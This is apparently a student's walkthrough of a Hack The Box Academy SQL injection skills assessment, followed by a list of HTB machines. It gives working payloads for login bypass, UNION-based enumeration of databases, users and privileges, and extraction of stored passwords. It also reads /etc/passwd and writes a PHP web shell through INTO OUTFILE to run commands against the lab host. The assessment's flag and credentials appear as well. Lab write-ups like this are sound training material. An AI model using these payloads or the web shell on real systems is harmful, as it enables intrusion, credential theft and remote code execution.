# Hack The Box Academy

## Skills Assessment - SQL Injection Fundamentals

## Authentication bypass login page

username: `' or 1=1-- -`

Now to all union attack inside search bar

## Find curent databanse name

`0' union select 1, database(), 2,4,5;-- -`

ilfreight

## Find current user

`0' union select 1, user(), 2,4,5;-- -`

root@localhost

## Find all database names

`0' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -`

information_schema
mysql
performance_schema
ilfreight
backup

## Find all tables inside ilfreight database

`0' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -`

users 	  ilfreight
payment 	ilfreight

## Find all coloumn of user tables

`0' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -`

USER 	               users 	performance_schema
CURRENT_CONNECTIONS  users 	performance_schema
TOTAL_CONNECTIONS 	 users 	performance_schema

id 	      users 	ilfreight
username 	users 	ilfreight
password 	users 	ilfreight

## Find username and password from users table

`0' UNION select 1,username, password,4,5 from users-- -`

adam 	1be9f5d3a82847b8acca40544f953515

## Find all column name for payment table (Not important for hacking this part)

`0' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='payment'-- -`

d 	    payment 	ilfreight
name 	  payment 	ilfreight
month 	payment 	ilfreigh
amount 	payment 	ilfreight
tax 	  payment 	ilfreight


## Find table names of backup database (Not important for this hacking task)

`0' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='backup'-- -`

admin_bk 	backup

## Find table names of admin_bk database (Not important for this hacking task)

`0' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA, 5 from INFORMATION_SCHEMA.COLUMNS where table_name='admin_bk'-- -`

username 	admin_bk 	backup
password 	admin_bk 	backup

## Find username and password from backup table of admin_bk database (Not important for this hacking task)

`0' UNION select 1,username, password,4,5 from backup.admin_bk-- -`

admin 	Inl@n3_fre1gh7_adm!n

NOTE: I loggied in using above credentials but it was exactly same 

## Find if user have super privilage

`0' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user-- -`

Y

## Find if root user have super privilage

`0' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user WHERE user="root"-- -`

Y

## Find our all privialage of root user

`0' UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

'root'@'localhost' 	SELECT 	4 	5
'root'@'localhost' 	INSERT 	4 	5
'root'@'localhost' 	UPDATE 	4 	5
'root'@'localhost' 	DELETE 	4 	5
'root'@'localhost' 	CREATE 	4 	5
'root'@'localhost' 	DROP 	4 	5
'root'@'localhost' 	RELOAD 	4 	5
'root'@'localhost' 	SHUTDOWN 	4 	5
'root'@'localhost' 	PROCESS 	4 	5
'root'@'localhost' 	FILE 	4 	5  <---------------------- This is privilage to write/read file, very important
'root'@'localhost' 	REFERENCES 	4 	5
'root'@'localhost' 	INDEX 	4 	5
'root'@'localhost' 	ALTER 	4 	5
'root'@'localhost' 	SHOW DATABASES 	4 	5
'root'@'localhost' 	SUPER 	4 	5
'root'@'localhost' 	CREATE TEMPORARY TABLES 	4 	5
'root'@'localhost' 	LOCK TABLES 	4 	5
'root'@'localhost' 	EXECUTE 	4 	5
'root'@'localhost' 	REPLICATION SLAVE 	4 	5
'root'@'localhost' 	REPLICATION CLIENT 	4 	5
'root'@'localhost' 	CREATE VIEW 	4 	5
'root'@'localhost' 	SHOW VIEW 	4 	5
'root'@'localhost' 	CREATE ROUTINE 	4 	5
'root'@'localhost' 	ALTER ROUTINE 	4 	5
'root'@'localhost' 	CREATE USER 	4 	5
'root'@'localhost' 	EVENT 	4 	5
'root'@'localhost' 	TRIGGER 	4 	5
'root'@'localhost' 	CREATE TABLESPACE 	4 	5
'root'@'localhost' 	DELETE HISTORY 	4 	5

## Find our where user can read/write in server

`0' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

SECURE_FILE_PRIV 		4 	5   <------- third column is blank meaning this user can write/read all directories (Very Good)

## Read password from server (Not important for this hacking task)

`0' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -`

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin postgres:x:101:103:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:102:104:MySQL Server,,,:/nonexistent:/bin/false 

## Test if we can read from server

`0' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboard/dashboard.php"), 3, 4, 5-- -`

$row[1] 	$row[2] 	$row[3] 	$row[4]
$row[1] 	$row[2] 	$row[3] 	$row[4]

ctrl + U and read source code, but nothing interesting was found

## Write command shel to server so we can run our own commands

`0' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -`

<permission denied, didn't allow to write me in this directory>

`0' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -`

<this one worked as i dont get any error on screen>

## Executing manual commands on server

`http://94.237.59.206:36381/dashboard/shell.php?0=id`

uid=33(www-data) gid=33(www-data) groups=33(www-data) 

`http://94.237.59.206:36381/dashboard/shell.php?0=ls ../../../../*.*`

OR

`http://94.237.59.206:36381/dashboard/shell.php?0=ls /`    <----- list all file in root directory and look for flag file


../../../../flag_cae1dadcd174.txt 

`http://94.237.59.206:36381/dashboard/shell.php?0=cat ../../../../flag_cae1dadcd174.txt`

OR

`http://94.237.59.206:36381/dashboard/shell.php?0=cat /flag_cae1dadcd174.txt`

528d6d9cedc2c7aab146ef226e918396     <------- HACKED (FLAG TEXT)




# Further Challenges on Hack The Box Main


In order to play the content below, you need an active subscription at Hack The Box

Machines

Sneaky M

Holiday H

Europa M

Charon H

Enterprise M

Nightmare I

Falafel H

Rabbit I

Fighter I

SecNotes M

Oz H

Giddy M

RedCross M

Help E

FluJab H

Unattended M

Writeup E

Jarvis M

Scavenger H

Zetta H

Bankrobber I

AI M

Control H

Fatty I

Multimaster I

Magic M

Cache M

Intense H

Unbalanced H

Breadcrumbs H

Proper H

CrossFitTwo I

Toolbox E

Monitors H

Spider H

Writer M

EarlyAccess H

Validation E

Overflow H

Union M

Pandora E

GoodGames E

Seventeen H

StreamIO M

Trick E

Faculty M

Shoppy E
Challenges


Cartographer E
Prolabs


Offshore I